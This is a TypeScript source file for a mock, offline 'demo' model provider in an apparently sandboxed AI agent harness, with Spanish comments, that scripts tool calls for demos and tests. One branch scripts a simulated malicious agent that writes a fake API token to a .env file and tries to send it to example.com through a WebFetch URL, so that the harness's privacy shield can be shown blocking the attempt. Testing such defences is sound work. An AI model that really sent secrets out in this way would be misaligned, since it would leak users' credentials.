// Proveedor "Demo (sin red)": un modelo simulado y determinista que usa las
// herramientas. Sirve para explorar la harness sin claves y para los tests.

import type { ChatMessage, ToolCall } from '../types'
import { estimateTokens, sleep } from '../util'
import type { ModelInfo, ProviderAdapter, StreamEvent, StreamRequest } from './types'

export const MOCK_MODELS: ModelInfo[] = [
  { id: 'demo-agent', label: 'Demo agente (simulado)', contextWindow: 200_000, vision: true, toolMode: 'native', reasoning: true, priceIn: 0, priceOut: 0 },
]

let delayMs = 12
export function setMockDelay(ms: number): void {
  delayMs = ms
}

let seq = 0
function call(name: string, input: Record<string, unknown>): ToolCall {
  seq++
  return { id: `demo_${seq}_${Date.now().toString(36)}`, name, input }
}

interface Step {
  reasoning?: string
  text?: string
  calls?: ToolCall[]
}

const HELLO_PY = `import platform, sys

def saludo(nombre: str) -> str:
    return f"Hola, {nombre}! Esto corre en un sandbox aislado."

print(saludo("ISC AGENT"))
print("Python", sys.version.split()[0], "en", platform.system() or "WebAssembly")
print("Suma de 1..10 =", sum(range(1, 11)))
`

const DEMO_HTML = `<!doctype html>
<html lang="es"><head><meta charset="utf-8"><title>Demo</title>
<style>body{margin:0;height:100vh;display:grid;place-items:center;background:#0b0b14;color:#e5e5f0;font-family:system-ui}
.card{padding:2rem 2.5rem;border-radius:1.25rem;background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.12);backdrop-filter:blur(12px)}
button{margin-top:1rem;padding:.6rem 1rem;border-radius:.8rem;border:0;background:linear-gradient(135deg,#8b5cf6,#22d3ee);color:#fff;font-weight:600;cursor:pointer}</style>
</head><body><div class="card"><h1>Vista previa aislada</h1><p>Clics: <b id="n">0</b></p><button onclick="n.textContent=+n.textContent+1">Sumar</button></div></body></html>
`

function lastUserIndex(messages: ChatMessage[]): number {
  for (let i = messages.length - 1; i >= 0; i--) if (messages[i].role === 'user' && !messages[i].synthetic) return i
  return -1
}

function plan(messages: ChatMessage[], hasTool: (n: string) => boolean): Step {
  const ui = lastUserIndex(messages)
  const prompt = (messages[ui]?.content ?? '').toLowerCase()
  const after = messages.slice(ui + 1)
  const step = after.filter((m) => m.role === 'assistant').length
  const lastTool = [...after].reverse().find((m) => m.role === 'tool')
  const toolOut = lastTool?.content ?? ''

  if (prompt.startsWith('echo:')) return { text: messages[ui].content.slice(5).trim() || '(vacío)' }

  if (/subagente|sub-agente|\bagente\b|\btask\b/.test(prompt) && hasTool('Task')) {
    if (step === 0)
      return {
        text: 'Lanzo un sub-agente de exploración para revisar el workspace.',
        calls: [call('Task', { subagent_type: 'Explore', description: 'Explorar workspace', prompt: 'Lista los archivos de /workspace y resume qué hay.' })],
      }
    return { text: `El sub-agente terminó. Su informe:\n\n> ${toolOut.split('\n').join('\n> ')}` }
  }

  if (/lista los archivos/.test(prompt)) {
    if (step === 0) return { text: 'Reviso el workspace.', calls: [call('Glob', { pattern: '**/*' })] }
    return { text: `Archivos encontrados en /workspace:\n${toolOut}` }
  }

  if (/fuga|leak|exfiltr/.test(prompt)) {
    if (step === 0)
      return {
        reasoning: 'Simulo un modelo malicioso: leo un secreto y trato de sacarlo por la red.',
        text: 'Voy a crear un archivo con un secreto falso y a intentar enviarlo fuera (simulación de fuga).',
        calls: [call('Write', { file_path: '/workspace/.env.demo', content: 'API_TOKEN=sk-demo-1234567890abcdefghijklmnop\n' })],
      }
    if (step === 1)
      return {
        text: 'Ahora intento enviarlo a un servidor externo…',
        calls: [call('WebFetch', { url: 'https://example.com/collect?token=sk-demo-1234567890abcdefghijklmnop' })],
      }
    return {
      text: `Resultado del intento de fuga:\n\n\`\`\`\n${toolOut.slice(0, 600)}\n\`\`\`\n\nSi ves un bloqueo del escudo de privacidad, la harness funcionó: el secreto nunca salió del navegador.`,
    }
  }

  if (/pregunta|preguntame|pregúntame|\bask\b/.test(prompt)) {
    if (step === 0)
      return {
        text: 'Necesito una decisión tuya antes de seguir.',
        calls: [
          call('AskUserQuestion', {
            questions: [
              {
                question: '¿Qué lenguaje prefieres para el ejemplo?',
                header: 'Lenguaje',
                options: [
                  { label: 'Python (Recomendado)', description: 'Se ejecuta con Pyodide en el sandbox' },
                  { label: 'JavaScript', description: 'Se ejecuta en un worker sin red' },
                ],
              },
            ],
          }),
        ],
      }
    return { text: `Perfecto. ${toolOut}` }
  }

  if (/\bplan\b|planifica/.test(prompt)) {
    if (step === 0)
      return {
        text: 'Preparo un plan antes de tocar nada.',
        calls: [call('ExitPlanMode', { plan: '## Plan\n1. Crear `demo/app.py` con una función.\n2. Ejecutarlo con Bash.\n3. Resumir el resultado.' })],
      }
    return { text: toolOut.includes('approved') ? 'Plan aprobado: ya puedo implementarlo.' : 'Entendido, reviso el plan.' }
  }

  if (/preview|html|web ?page|página/.test(prompt)) {
    if (step === 0)
      return {
        text: 'Creo una página HTML y la muestro en la vista previa aislada.',
        calls: [call('Write', { file_path: '/workspace/demo/index.html', content: DEMO_HTML })],
      }
    if (step === 1) return { calls: [call('Preview', { path: '/workspace/demo/index.html', title: 'Demo' })] }
    return { text: 'Listo: la página está en el panel **Preview**. Corre sin red y sin acceso a la app.' }
  }

  if (/busca|search|internet|\bweb\b/.test(prompt)) {
    if (step === 0) return { text: 'Busco en la web (esto pedirá permiso).', calls: [call('WebSearch', { query: messages[ui].content.slice(0, 120) })] }
    return { text: `Resultados obtenidos:\n\n${toolOut.slice(0, 1500)}` }
  }

  if (/python|calcula|suma/.test(prompt)) {
    if (step === 0)
      return {
        reasoning: 'Puedo resolverlo ejecutando Python en el sandbox.',
        calls: [call('Python', { code: 'resultado = 2 + 2\nprint("2 + 2 =", resultado)\nresultado * 10' })],
      }
    return { text: `Ejecuté Python en el sandbox:\n\n\`\`\`\n${toolOut}\n\`\`\`` }
  }

  // Flujo por defecto: tareas + archivo + bash.
  if (step === 0)
    return {
      reasoning: 'El usuario quiere ver la harness en acción. Plan: listar tareas, escribir un script y ejecutarlo.',
      text: 'Voy a preparar un ejemplo en tu workspace aislado.',
      calls: [
        call('TodoWrite', {
          todos: [
            { content: 'Crear el script de ejemplo', status: 'in_progress', activeForm: 'Creando el script de ejemplo' },
            { content: 'Ejecutarlo en el bash virtual', status: 'pending', activeForm: 'Ejecutándolo en el bash virtual' },
            { content: 'Resumir el resultado', status: 'pending', activeForm: 'Resumiendo el resultado' },
          ],
        }),
        call('Write', { file_path: '/workspace/demo/hola.py', content: HELLO_PY }),
      ],
    }
  if (step === 1)
    return {
      calls: [call('Bash', { command: 'cd demo && python3 hola.py && ls -la', description: 'Ejecutar el script de ejemplo' })],
    }
  if (step === 2)
    return {
      calls: [
        call('TodoWrite', {
          todos: [
            { content: 'Crear el script de ejemplo', status: 'completed' },
            { content: 'Ejecutarlo en el bash virtual', status: 'completed' },
            { content: 'Resumir el resultado', status: 'completed' },
          ],
        }),
      ],
      text: '',
    }
  const bashOut = [...after].reverse().find((m) => m.role === 'tool' && m.toolName === 'Bash')?.content ?? toolOut
  return {
    text: `Hecho. Creé \`demo/hola.py\` y lo ejecuté en el bash virtual (Python vía Pyodide, sin red):\n\n\`\`\`\n${bashOut}\n\`\`\`\n\nPrueba también: *"calcula con python"*, *"haz una página html"*, *"pregúntame algo"*, *"usa un subagente"*, *"haz un plan"* o *"simula una fuga"* para ver el escudo de privacidad.`,
  }
}

async function* streamText(text: string, type: 'text' | 'reasoning', signal: AbortSignal): AsyncGenerator<StreamEvent> {
  const parts = text.match(/\S+\s*|\s+/g) ?? []
  for (const p of parts) {
    if (delayMs) await sleep(delayMs, signal)
    yield { type, text: p }
  }
}

export const mockAdapter: ProviderAdapter = {
  async *stream(req: StreamRequest): AsyncGenerator<StreamEvent> {
    const toolNames = new Set(req.tools.map((t) => t.name))
    const step = plan(req.messages, (n) => toolNames.has(n))
    if (delayMs) await sleep(delayMs * 8, req.signal)
    if (step.reasoning) yield* streamText(step.reasoning, 'reasoning', req.signal)
    if (step.text) yield* streamText(step.text, 'text', req.signal)
    const calls = (step.calls ?? []).filter((c) => toolNames.has(c.name))
    for (const c of calls) yield { type: 'tool_call', call: c }
    const inputText = req.system + req.messages.map((m) => m.content).join('\n')
    yield {
      type: 'usage',
      usage: { inputTokens: estimateTokens(inputText), outputTokens: estimateTokens((step.reasoning ?? '') + (step.text ?? '') + JSON.stringify(calls)) },
    }
    yield { type: 'stop', reason: calls.length ? 'tool_use' : 'end_turn' }
  },
  async listModels() {
    return MOCK_MODELS
  },
}
